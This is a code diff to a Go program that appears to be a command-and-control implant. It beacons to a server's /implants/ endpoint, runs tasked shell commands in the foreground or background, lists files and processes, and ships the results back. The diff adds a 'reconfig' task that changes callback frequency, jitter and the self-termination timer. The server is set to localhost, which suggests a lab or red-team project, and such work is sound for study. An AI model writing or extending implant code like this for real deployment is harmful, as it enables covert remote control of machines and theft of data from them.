@@ -8,8 +8,11 @@ import (
 	"net"
 	"os"
 	"strconv"
+	"strings"
 	"time"
 )
+
+var callbackTimer = CallbackInfo{Callback_freq: 1, Jitter: 15, SelfTerminate: 20}
 
 type ResultsCreate struct {
 	TaskingID float64 `json:"tasking_id"`
@@ -51,6 +54,14 @@ func PsHandler(serverUrl string, taskData map[string]interface{}) {
 	DataShipper(serverUrl, taskData, processList)
 }
 
+func ReconfigHandler(serverUrl string, taskData map[string]interface{}) {
+	splitArgs := strings.Split(taskData["args"].(string), " ")
+	callbackTimer.Callback_freq, _ = strconv.Atoi(splitArgs[0])
+	callbackTimer.Jitter, _ = strconv.Atoi(splitArgs[1])
+	callbackTimer.SelfTerminate, _ = strconv.Atoi(splitArgs[2])
+        DataShipper(serverUrl, taskData, "true")
+}
+
 func ParseTasks(serverUrl string, tasking string) (string, error) {
 
 	var tasks []map[string]interface{}
@@ -67,15 +78,14 @@ func ParseTasks(serverUrl string, tasking string) (string, error) {
 		fmt.Printf("Args: %v\n", taskData["args"])
 		if taskData["task"] == "ls" {
 			LsHandler(url, taskData)
-
 		} else if taskData["task"] == "ps" {
 			PsHandler(url, taskData)
-
 		} else if taskData["task"] == "exec_bg" {
 			ExecBgHandler(url, taskData)
-
 		} else if taskData["task"] == "exec_fg" {
 			ExecFgHandler(url, taskData)
+		} else if taskData["task"] == "reconfig" {
+			ReconfigHandler(serverUrl, taskData)
 		}
 
 	}
@@ -157,8 +167,6 @@ func main() {
 	serverUrl := "http://127.0.0.1:8000"
 
 	initialInfo := GatherInfo()
-
-	callbackTimer := CallbackInfo{Callback_freq: 1, Jitter: 15, SelfTerminate: 20}
 
 	// register with server
 	resp, err := PostJson(serverUrl+"/implants/", initialInfo)
